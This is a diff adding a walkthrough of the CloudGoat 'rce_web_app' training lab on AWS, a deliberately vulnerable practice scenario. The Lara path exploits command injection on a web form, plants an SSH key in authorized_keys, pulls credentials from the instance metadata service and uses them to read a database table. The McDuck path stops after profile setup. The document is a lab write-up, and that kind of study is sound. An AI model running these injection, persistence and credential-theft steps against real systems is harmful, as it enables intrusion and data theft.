@@ -322,7 +322,77 @@ cat outfile
 **Scenario Goal: Find a secret stored in the RDS database**
 1. Create scenario   
 `./cloudgoat.py create rce_web_app --profile goat`   
-2. 
+2. This sceanrio kind of has 2 goals, and that is to find the secret in the database as each user. Continue through save the Outputs and continue through, 1st as **lara**, then as **mcduck**    
+
+### rce_web_app as Lara
+1. Create an AWS CLI profile for Lara
+`aws configure --profile lara`   
+    * AWS Access Key ID: __lara aws_access_key_id__   
+    * AWS Secret Access Key: __lara aws_secret_access_key__   
+    * Default region name: __us-east-1__   
+    * Default output format: __leave blank__   
+2. Look for information at S3 bucket storage   
+`aws s3 ls --profile lara`
+3. Recursively look thorugh the S3 buckets
+`aws s3 ls s3://<S3bucket> --recursive --profile lara`   
+Lara only has access to the log file bucket
+4. Copy the log file    
+`aws s3 cp s3://<S3LogBucket>/dir/file.log ./ --profile lara`
+5. Review the log file  
+`cat file.log`  
+This log file shows an app GET a load-balancer, which is unreacheable from curl
+6. List load balancers    
+`aws elbv2 describe-load-balancers --profile lara`
+7. Copy the DNSName and paste it in a browser window    
+This results in a website that mentions it's members are sent a **secret URL**    
+8. Review the log file again   
+Close examination shows a site.html at the end of one of the 1st GET requests
+9. Copy the URI and paste it to the end of the DNSName in the browser  
+10. Navigating to that page reveals personalized login command, which specifically states "do not enter any other commands"   That's a good indication that it doesn't appropriately filter user input
+11. Test injection susceptability with a single quote    
+`'`    
+Oh nos, This "Gold-Star" executive user signup site appear to allow users to execute bash commands
+12. Test bash commands
+`whoami`   
+Root can do anything! This is bad.  
+`ls -al /home/`
+13. Give the system your ssh public key, from your local computer  
+`cat ~/.ssh/id_rsa.pub`
+14. Copy the public ssh key value and paste it into the site with the following commands   
+`echo "<publicSSHkey>" >> /home/ubuntu/.ssh/authorized_keys`
+15. Obtain the public IP address of the server    
+`curl ifconfig.me`   
+16. SSH into the server from your local system
+`ssh -i ~/.ssh/id_rsa ubuntu@<publicIP>`
+17. Now that we're on an AWS system, curl the AWS metadata server to see what information can be obtained   
+`curl -v http://169.254.169.254/`   
+`curl -v http://169.254.169.254/latest/`   
+`curl -v http://169.254.169.254/user-data/`   
+This appears to be a bash_history file with credentials in it   
+18. Using the credentials found, log into postgreSQL    
+`psql postgresql://<usr>:<pass>@<rds-instance>:5432/<db_name>`   
+ 19. Access the database tables    
+ `\dt`  
+ 20. Read the sensitive information    
+ `select * from sensitive_information;`    
+ **Goal Achieved** 
+
+#### Remove rce_web_app Lara data
+1. Quit the DB    
+`\q`
+2. Remove your public ssh key  
+`vim ~/.ssh/authorized_keys`
+3. Leave the AWS instance    
+*CTRL+d*  
+4. Remove Lara's AWS CLI profile
+
+### rce_web_app as McDuck
+1. Create an AWS CLI profile for McDuck   
+`aws configure --profile mcduck`   
+    * AWS Access Key ID: __mcduck aws_access_key_id__   
+    * AWS Secret Access Key: __mcduck aws_secret_access_key__   
+    * Default region name: __us-east-1__   
+    * Default output format: __leave blank__   
 
 
 ## codebuild_secrets
